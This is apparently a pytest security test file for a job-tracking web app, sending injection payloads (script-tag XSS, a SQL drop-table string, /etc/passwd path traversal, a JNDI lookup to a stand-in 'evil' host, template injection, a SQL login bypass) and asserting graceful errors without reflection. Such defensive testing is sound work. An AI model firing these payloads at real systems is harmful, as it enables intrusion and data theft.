"""Injection / robustness: unicode, very long strings, HTML/script, SQL-ish, extreme numbers.
Assert no 500 (graceful 4xx or handled), and no unescaped reflection on /track."""
import pytest

from app import db

PAYLOADS = [
    "日本語☃ unicode",
    "x" * 10000,
    "<script>alert('xss')</script>",
    "'; DROP TABLE users; --",
    "../../etc/passwd",
    "\x00null\x00byte",
    "${jndi:ldap://evil}",
    "{{7*7}}",
]


@pytest.mark.parametrize("payload", PAYLOADS)
def test_track_no_500_no_reflection(client, make_user, payload):
    u = make_user()
    tok = u["dash_token"]
    r = client.get("/track", params={"t": tok, "u": payload, "s": payload})
    assert r.status_code != 500
    # the script payload must never appear raw
    assert "<script>alert('xss')</script>" not in r.text


@pytest.mark.parametrize("payload", PAYLOADS)
def test_save_job_no_500(client, token, payload):
    r = client.post(f"/api/save-job?token={token}",
                    json={"url": "https://e.com/" + payload[:50], "title": payload,
                          "company": payload, "description": payload})
    assert r.status_code != 500


@pytest.mark.parametrize("payload", PAYLOADS)
def test_catalog_query_no_500(client, payload):
    r = client.get("/api/catalog", params={"q": payload, "category": payload})
    assert r.status_code != 500


@pytest.mark.parametrize("payload", PAYLOADS)
def test_event_no_500(client, token, payload):
    r = client.post(f"/api/event?token={token}",
                    json={"event": "clicked", "url": payload, "category": payload})
    assert r.status_code != 500


@pytest.mark.parametrize("payload", PAYLOADS)
def test_resume_ats_no_500(client, token, payload):
    r = client.post(f"/api/resume/ats?token={token}",
                    json={"resume": {"summary": payload, "skills": [payload]}, "jd": payload})
    assert r.status_code != 500


def test_update_job_huge_id(client, make_user):
    u = make_user()
    r = client.post(f"/api/jobs/999999999999999999?token={u['dash_token']}&status=applied")
    assert r.status_code in (200, 422)  # no 500


def test_update_job_negative_huge(client, make_user):
    u = make_user()
    r = client.post(f"/api/jobs/-999999999?token={u['dash_token']}&applied=1")
    assert r.status_code != 500


def test_login_sql_injection(client):
    r = client.post("/login", data={"email": "' OR '1'='1", "password": "' OR '1'='1"},
                    follow_redirects=False)
    assert r.status_code == 302 and "error=1" in r.headers["location"]  # parameterized, no bypass


def test_register_xss_name(client):
    import secrets
    e = f"x{secrets.token_hex(4)}@example.com"
    r = client.post("/register",
                    data={"email": e, "password": "pw123456", "name": "<script>alert(1)</script>"},
                    follow_redirects=False)
    assert r.status_code == 302


def test_save_job_unicode_persisted_safely(client, token):
    r = client.post(f"/api/save-job?token={token}",
                    json={"url": "https://e.com/uni1", "title": "日本語 Engineer ☃",
                          "company": "☃Co", "description": "x"})
    assert r.status_code == 200
